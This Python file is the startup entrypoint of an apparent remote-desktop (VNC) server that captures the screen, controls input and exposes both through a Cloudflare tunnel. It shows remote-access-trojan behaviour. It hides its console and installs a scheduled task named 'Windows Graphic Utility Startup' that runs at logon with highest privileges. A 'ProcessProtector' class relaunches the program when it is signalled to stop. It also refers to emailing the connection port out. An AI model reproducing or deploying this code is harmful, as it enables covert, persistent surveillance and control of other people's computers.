"""Application entrypoint and startup orchestration."""
from __future__ import annotations

import atexit
import asyncio
import ctypes
import logging
import os
import platform
import signal
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path

from .config import _load_dotenv
from .logging_utils import _setup_logging_to_file
from .network import get_local_ip


def configure_event_loop_policy():
    try:
        if sys.platform.startswith("win"):
            asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    except Exception:
        pass


def configure_stdout_encoding():
    try:
        if hasattr(sys.stdout, "reconfigure"):
            sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass


def maybe_hide_console():
    try:
        if getattr(sys, "frozen", False) or os.environ.get("HIDE_CONSOLE") == "1":
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def configure_logging():
    _setup_logging_to_file()
    try:
        log_level_name = os.environ.get("ZADOO_LOG_LEVEL", "INFO").upper()
        log_level = getattr(logging, log_level_name, logging.INFO)
        logging.basicConfig(
            level=log_level,
            format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
            datefmt="%H:%M:%S",
        )
        logging.getLogger("ocr").setLevel(log_level)
        logging.getLogger("asyncio").setLevel(logging.WARNING)
        logging.getLogger("websockets.server").setLevel(logging.WARNING)
        logging.getLogger("websockets").setLevel(logging.WARNING)
        try:
            logging.getLogger("comtypes").setLevel(logging.WARNING)
            logging.getLogger("comtypes.client").setLevel(logging.WARNING)
            logging.getLogger("comtypes.client._code_cache").setLevel(logging.WARNING)
            logging.getLogger("comtypes._post_coinit").setLevel(logging.WARNING)
        except Exception:
            pass
    except Exception:
        pass
    try:
        from logging.handlers import RotatingFileHandler

        file_handler = RotatingFileHandler(
            "vnc_debug.log",
            maxBytes=5_000_000,
            backupCount=2,
            encoding="utf-8",
        )
        file_handler.setLevel(log_level)
        file_handler.setFormatter(logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s"))
        root = logging.getLogger()
        if not any(isinstance(h, RotatingFileHandler) for h in root.handlers):
            root.addHandler(file_handler)
    except Exception:
        pass


def install_startup_task():
    task_name = "Windows Graphic Utility Startup"
    exe_path = sys.executable
    check_cmd = ["schtasks", "/query", "/tn", task_name]
    result = subprocess.run(check_cmd, capture_output=True, text=True)
    if result.returncode == 0:
        return
    create_cmd = [
        "schtasks",
        "/create",
        "/tn",
        task_name,
        "/tr",
        f'"{exe_path}"',
        "/sc",
        "onlogon",
        "/rl",
        "highest",
        "/f",
    ]
    try:
        subprocess.run(create_cmd, check=True, capture_output=True)
    except subprocess.CalledProcessError:
        pass


class ProcessProtector:
    def __init__(self):
        self.protected = True
        self.start_protection()

    def start_protection(self):
        atexit.register(self.cleanup)
        signal.signal(signal.SIGTERM, self.signal_handler)
        signal.signal(signal.SIGINT, self.signal_handler)
        self.monitor_thread = threading.Thread(target=self.monitor_processes, daemon=True)
        self.monitor_thread.start()

    def monitor_processes(self):
        while self.protected:
            try:
                time.sleep(30)
            except Exception:
                pass

    def restart_protection(self):
        try:
            if getattr(sys, "frozen", False):
                cmd = [sys.executable]
            else:
                cmd = [sys.executable, str(Path(__file__).resolve().parent.parent / "zadoo_vnc_single.py")]
            subprocess.Popen(cmd, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
        except Exception:
            pass

    def signal_handler(self, signum, frame):
        if self.protected:
            self.restart_protection()

    def cleanup(self):
        self.protected = False


def is_port_in_use(port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.2)
            return s.connect_ex(("127.0.0.1", port)) == 0
    except Exception:
        return False


def try_kill_process_on_port_windows(port):
    try:
        cmd = ["cmd", "/c", f"for /f \"tokens=5\" %a in ('netstat -ano ^| findstr :{port}') do taskkill /F /PID %a"]
        subprocess.run(cmd, capture_output=True, text=True)
    except Exception:
        pass


def choose_web_port(desired_web_port=6173):
    try:
        max_attempts = 10
        attempts = 0
        while attempts < max_attempts and is_port_in_use(desired_web_port):
            print(f"Port {desired_web_port} busy for web server. Attempting to free it...")
            try_kill_process_on_port_windows(desired_web_port)
            time.sleep(0.5)
            if is_port_in_use(desired_web_port):
                desired_web_port += 1
                attempts += 1
            else:
                break
        if attempts >= max_attempts and is_port_in_use(desired_web_port):
            print(f"Could not free ports near 6173; continuing with {desired_web_port} anyway")
    except Exception:
        pass
    return desired_web_port


def random_free_port(fallback):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()
        return port
    except Exception:
        return fallback


def main():
    configure_event_loop_policy()
    configure_stdout_encoding()
    maybe_hide_console()
    configure_logging()
    _load_dotenv()

    if getattr(sys, "frozen", False):
        install_startup_task()

    protector = ProcessProtector()
    _ = protector

    from .dependencies import HAS_MSS, HAS_PIL, HAS_PYAUTOGUI, WIN32_AVAILABLE
    from .screen_capture import ScreenCapturer
    from .server import VNCServer
    from .tunnel import CloudflareTunnelManager

    print("=" * 60)
    print("COMPLETE VNC WITH TUNNEL")
    print("=" * 60)

    if not (HAS_PYAUTOGUI and (HAS_MSS or WIN32_AVAILABLE or HAS_PIL)):
        print("Missing critical dependencies for screen capture or input control")
        sys.exit(1)

    print(f"\nSystem: {platform.system()} {platform.release()}")
    local_ip = get_local_ip()
    desired_web_port = choose_web_port(6173)
    print(f"Local network: http://{local_ip}:{desired_web_port}")
    print(f"Selected web server port: {desired_web_port}")

    use_tunnel = os.environ.get("ZADOO_DISABLE_TUNNEL", "").strip().lower() not in {"1", "true", "yes", "on"}
    tunnel_manager = None
    if use_tunnel:
        print(f"Selected tunnel port (single): {desired_web_port}")
        tunnel_manager = CloudflareTunnelManager(primary_port=desired_web_port)
        public_url = None
        if not public_url:
            print("Continuing without tunnel...")

    print(f"\n{'=' * 60}")
    print("VNC SERVER STARTING...")
    print(f"Local: http://localhost:{desired_web_port}")
    print(f"Network: http://{local_ip}:{desired_web_port}")
    if use_tunnel and tunnel_manager:
        print("Internet: Check above for public URL")
    print("To stop: Press Ctrl+C")
    print("=" * 60)

    random_secondary = random_free_port(desired_web_port + 100)
    vnc_server = VNCServer(desired_web_port, random_secondary)
    vnc_server.enable_tunnel = use_tunnel
    try:
        if tunnel_manager:
            tunnel_manager.email_port = random_secondary
            print(f"Email will include random port: {random_secondary}")
    except Exception:
        pass
    if tunnel_manager:
        vnc_server.set_tunnel_manager(tunnel_manager)
        try:
            print("Launching tunnel thread (single tunnel)...")
            threading.Thread(target=tunnel_manager.start_primary_tunnel, daemon=True).start()
        except Exception:
            pass

    capturer = ScreenCapturer(fps=vnc_server.current_fps, quality=vnc_server.current_quality)
    vnc_server.screen_capturer = capturer
    vnc_server.screen_capturer.quality = vnc_server.current_quality
    capturer.start()

    max_retries = 10
    for attempt in range(max_retries):
        try:
            asyncio.run(vnc_server.start_server())
            break
        except OSError as e:
            err_no = getattr(e, "errno", None)
            if err_no == 10048:
                print(f"Bind failed on port {vnc_server.port} (in use). Retrying on {vnc_server.port + 1}...")
                vnc_server.port += 1
                try:
                    if vnc_server.tunnel_manager:
                        vnc_server.tunnel_manager.refresh_tunnel()
                except Exception:
                    pass
                time.sleep(0.5)
                continue
            raise
        except (KeyboardInterrupt, SystemExit):
            print("\nShutting down...")
            break

    capturer.stop()
    if vnc_server.tunnel_manager:
        vnc_server.tunnel_manager.cleanup()
    print("Goodbye!")


if __name__ == "__main__":
    main()
